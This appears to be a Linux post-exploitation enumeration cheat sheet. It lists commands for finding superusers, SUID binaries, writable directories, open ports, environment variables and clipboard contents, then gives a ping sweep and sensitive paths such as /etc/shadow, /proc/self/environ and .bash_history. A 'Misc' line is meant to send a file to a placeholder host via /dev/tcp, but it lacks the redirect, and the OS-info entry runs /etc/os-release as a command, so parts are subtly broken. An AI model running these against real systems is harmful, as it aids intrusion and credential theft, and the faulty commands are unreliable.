# Commands
## User Information
```bash
# User info
id || (whoami && groups) 2>/dev/null
# Current PGP keys
gpg --list-keys 2>/dev/null
# List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
# Logged in users
w
```


## System Information
```bash
# Running processes
ps aux

# Environment variables
(env || set) 2>/dev/null

# Network topology
cat /proc/net/fib_trie

# Domain name
hostname

# OS info
/etc/os-release
```

## Interesting Files and DIRs
```bash
# Sort files by date
ls -ltrh

# Writeable folders
find / -writable -type d 2>/dev/null

# Find SUID files
find / -perm -4000 2>/dev/null
```

## Network
```bash
# Open ports
(netstat -punta || ss --ntpu)
netstat -tulnp
ifconfig
```

## Misc
```bash
# Human readable JSON data (jq)
cat <json_file> | jq

# Download file from shell session
cat <file> /dev/tcp/<ip>/<port>

# PING SWEEP - If one suspects that there are other machines on the network --- Assuming that current machine is in a VM or a container
for i in {1..254}; do (ping -c 1 10.10.10.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```

# Clipboard
Look for anything interesting in the clipboard

```bash

if [ `which xclip 2>/dev/null` ]; then
		echo "Highlighted text: "`xclip -o 2>/dev/null`

	elif [ `which xsel 2>/dev/null` ]; then
		echo "Clipboard: "`xsel -ob 2>/dev/null`
		echo "Highlighted text: "`xsel -o 2>/dev/null`
	
	else echo "Not found xsel and xclip"
fi
```

# Directories

##  Place For Unusual Files
```bash
/tmp
/dev/shm
```

sd
## Installed Software
```bash
/opt
```
## Changing Files
```bash
/var
/var/log
/var/www/html
```

## Web Related
```bash
/etc/apache2
/etc/httpd
/etc/nginx
```
## System and User Related
```bash
/etc/hosts
/etc/issue
/etc/motd
/etc/passwd
/etc/group
/etc/resolv.conf
/etc/shadow
```
## Own User Interesting Files
```bash
/home/USERNAME/.bash_history
/home/USERNAME/.profile
```
## System Information
```bash
/proc/sched_debug
/proc/net/fib_trie
/proc/version
/proc/self/environ
/proc/self/cmdline
```
